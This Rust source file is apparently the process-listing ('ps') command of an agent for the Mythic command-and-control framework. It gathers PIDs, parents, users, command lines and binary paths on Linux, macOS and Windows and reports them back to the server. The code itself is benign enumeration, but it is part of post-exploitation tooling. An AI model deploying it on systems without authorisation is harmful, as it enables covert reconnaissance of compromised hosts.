//! Process listing — cross-platform.
//!
//! Linux: parses `/proc` filesystem.
//! macOS: uses `ps` command.
//! Windows: uses `wmic` command (or fallback to `tasklist`).
//!
//! Task parameters (JSON):
//! ```json
//! {
//!     "host": "optional-hostname"
//! }
//! ```
//!
//! Response: `TaskResponse.processes` with a `Vec<ProcessEntry>`.

use mythic::{ProcessEntry, TaskMessage, TaskResponse};
use serde::Deserialize;

#[allow(unused_imports)]
use crate::sys::encoding::decode_output;

// ── Params ──────────────────────────────────────────────────

#[derive(Deserialize)]
struct Params {
    #[serde(default)]
    host: Option<String>,
}

/// Linux `USER_HZ` — the kernel's clock-tick rate. Defaults to 100, but
/// Docker-on-Mac hosts, some embedded kernels, and tickless configs use
/// 250/300/1000. We read `_SC_CLK_TCK` at runtime so cross-architecture
/// or non-standard host kernels don't produce wildly wrong `start_time`
/// values (which Mythic then shows in the process browser).
#[cfg(target_os = "linux")]
fn clock_ticks_per_second() -> u64 {
    // SAFETY: sysconf is thread-safe and the result is a long.
    let ticks = unsafe { libc::sysconf(libc::_SC_CLK_TCK) };
    if ticks > 0 {
        ticks as u64
    } else {
        // Fall back to the historical Linux default.
        100
    }
}

// ── Linux: parse /proc ──────────────────────────────────────

#[cfg(target_os = "linux")]
fn list_processes() -> Result<Vec<ProcessEntry>, String> {
    let mut procs: Vec<ProcessEntry> = Vec::new();
    let hz = clock_ticks_per_second();

    let dir = std::fs::read_dir("/proc").map_err(|e| format!("read /proc: {e}"))?;

    for entry in dir.flatten() {
        let name = entry.file_name();
        let name_str = name.to_string_lossy();

        // Only process numeric dirs (PIDs)
        let pid: i64 = match name_str.parse() {
            Ok(p) => p,
            Err(_) => continue,
        };

        let proc_path = entry.path();

        // Read /proc/<pid>/stat for process name, ppid, start_time
        let stat_path = proc_path.join("stat");
        let stat = match std::fs::read_to_string(&stat_path) {
            Ok(s) => s,
            Err(_) => continue,
        };

        // Parse stat: pid (name) state ppid ...
        let comm_end = stat.rfind(')').unwrap_or(0);
        let rest = if comm_end + 1 < stat.len() { &stat[comm_end + 2..] } else { "" };
        let fields: Vec<&str> = rest.split_whitespace().collect();

        let ppid: Option<i64> = fields.first().and_then(|s| s.parse().ok());
        // starttime is at field index 19 (0-based after comm+state removal:
        // state is field 0, then ppid=1, ..., starttime=19). The value is
        // in `_SC_CLK_TCK` units; convert to milliseconds using the live
        // tick rate.
        let start_time: Option<i64> = fields.get(19).and_then(|s| {
            let ticks: u64 = s.parse().ok()?;
            Some((ticks * 1000 / hz) as i64)
        });

        // Read /proc/<pid>/cmdline for command line
        let cmdline_path = proc_path.join("cmdline");
        let cmdline = std::fs::read_to_string(&cmdline_path)
            .unwrap_or_default()
            .replace('\0', " ");

        // Read /proc/<pid>/exe link for binary path
        let bin_path = std::fs::read_link(proc_path.join("exe"))
            .map(|p| p.to_string_lossy().to_string())
            .ok();

        // Read /proc/<pid>/status for Uid
        let user = std::fs::read_to_string(proc_path.join("status"))
            .ok()
            .and_then(|status| {
                status
                    .lines()
                    .find(|l| l.starts_with("Uid:"))
                    .and_then(|l| l.split_whitespace().nth(1).map(|s| s.to_string()))
            });

        // Extract process name from stat (between parentheses)
        let proc_name = if let Some(start) = stat.find('(') {
            if let Some(end) = stat.rfind(')') {
                stat[start + 1..end].to_string()
            } else {
                name_str.to_string()
            }
        } else {
            name_str.to_string()
        };

        // Build cmd_line with proper formatting
        let command_line = if cmdline.trim().is_empty() {
            proc_name.clone()
        } else {
            cmdline.trim().to_string()
        };

        procs.push(ProcessEntry {
            process_id: pid,
            name: proc_name,
            host: String::new(),
            parent_process_id: ppid,
            architecture: Some(std::env::consts::ARCH.into()),
            bin_path,
            user: Some(user.unwrap_or_default()),
            command_line: Some(command_line),
            start_time,
            ..Default::default()
        });
    }

    Ok(procs)
}

// ── macOS: use ps command ───────────────────────────────────

#[cfg(target_os = "macos")]
fn list_processes() -> Result<Vec<ProcessEntry>, String> {
    let output = std::process::Command::new("ps")
        .args(["-eo", "pid,ppid,user,comm,args"])
        .output()
        .map_err(|e| format!("ps failed: {e}"))?;

    let stdout = decode_output(&output.stdout);
    let mut procs: Vec<ProcessEntry> = Vec::new();

    for line in stdout.lines().skip(1) {
        let parts: Vec<&str> = line.splitn(5, |c: char| c.is_whitespace()).collect();
        if parts.len() < 4 {
            continue;
        }
        let pid: i64 = match parts[0].parse() {
            Ok(p) => p,
            Err(_) => continue,
        };
        let ppid: Option<i64> = parts[1].parse().ok();
        let user = parts[2].to_string();
        let name = parts[3].to_string();
        let cmdline = parts.get(4).unwrap_or(&"").to_string();

        procs.push(ProcessEntry {
            process_id: pid,
            name,
            host: String::new(),
            parent_process_id: ppid,
            architecture: Some(std::env::consts::ARCH.into()),
            user: Some(user),
            command_line: Some(cmdline),
            ..Default::default()
        });
    }

    Ok(procs)
}

// ── Windows: use wmic ───────────────────────────────────────

#[cfg(windows)]
fn list_processes() -> Result<Vec<ProcessEntry>, String> {
    let output = std::process::Command::new("wmic")
        .args([
            "process",
            "get",
            "ProcessId,ParentProcessId,Name,CommandLine",
            "/format:csv",
        ])
        .output()
        .or_else(|_| {
            // Fallback: try tasklist
            std::process::Command::new("tasklist")
                .args(["/FO", "CSV", "/NH"])
                .output()
        })
        .map_err(|e| format!("wmic/tasklist failed: {e}"))?;

    let stdout = decode_output(&output.stdout);
    let mut procs: Vec<ProcessEntry> = Vec::new();

    for line in stdout.lines().skip(1) {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }

        // CSV format: Node,ProcessId,ParentProcessId,Name,CommandLine
        let parts: Vec<&str> = line.split(',').collect();
        if parts.len() < 4 {
            continue;
        }

        let pid: i64 = match parts[1].trim_matches('"').parse() {
            Ok(p) => p,
            Err(_) => continue,
        };
        let ppid: Option<i64> = parts[2].trim_matches('"').parse().ok();
        let name = parts[3].trim_matches('"').to_string();
        let cmdline = parts.get(4).map(|s| s.trim_matches('"').to_string());

        procs.push(ProcessEntry {
            process_id: pid,
            name,
            host: String::new(),
            parent_process_id: ppid,
            architecture: Some(std::env::consts::ARCH.into()),
            command_line: cmdline,
            ..Default::default()
        });
    }

    Ok(procs)
}

// ── Fallback (unknown OS) ───────────────────────────────────

#[cfg(not(any(target_os = "linux", target_os = "macos", windows)))]
fn list_processes() -> Result<Vec<ProcessEntry>, String> {
    Err("ps: unsupported platform".into())
}

// ── Main handler ────────────────────────────────────────────

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("ps parse error: {e}")),
    };

    match list_processes() {
        Ok(mut procs) => {
            // Only set host if explicitly provided; otherwise let Mythic auto-fill
            let host = params.host.filter(|h| !h.is_empty()).unwrap_or_default();

            // Mark for auto-cleanup on all entries
            for p in &mut procs {
                p.update_deleted = true;
                if !host.is_empty() {
                    p.host = host.clone();
                }
                // host left empty → Mythic fills from callback info
            }

            // The `user_output` is intentionally None — the Python
            // `PsCommand.process_response` formats the structured process
            // list and writes it via `MythicRPCTaskUpdate`. Writing a
            // duplicate `{count} processes` summary here would show up as
            // a second, less-informative output block in the UI.
            TaskResponse {
                task_id: task.id,
                completed: Some(true),
                status: Some("completed".into()),
                user_output: None,
                processes: procs,
                ..Default::default()
            }
        }
        Err(e) => TaskResponse::failed(task.id, &e),
    }
}

// ── Tests ───────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ps_output() {
        let task = TaskMessage {
            command: "ps".into(),
            parameters: "{}".into(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert!(resp.completed == Some(true));
        assert!(!resp.processes.is_empty());
        // Verify at least our own process appears
        let our_pid = std::process::id() as i64;
        assert!(resp.processes.iter().any(|p| p.process_id == our_pid));
    }

    #[test]
    fn test_process_entry_has_required_fields() {
        let task = TaskMessage {
            command: "ps".into(),
            parameters: "{}".into(),
            ..Default::default()
        };
        let resp = handle(&task);
        for entry in &resp.processes {
            assert!(entry.process_id > 0);
            assert!(!entry.name.is_empty());
        }
    }
}
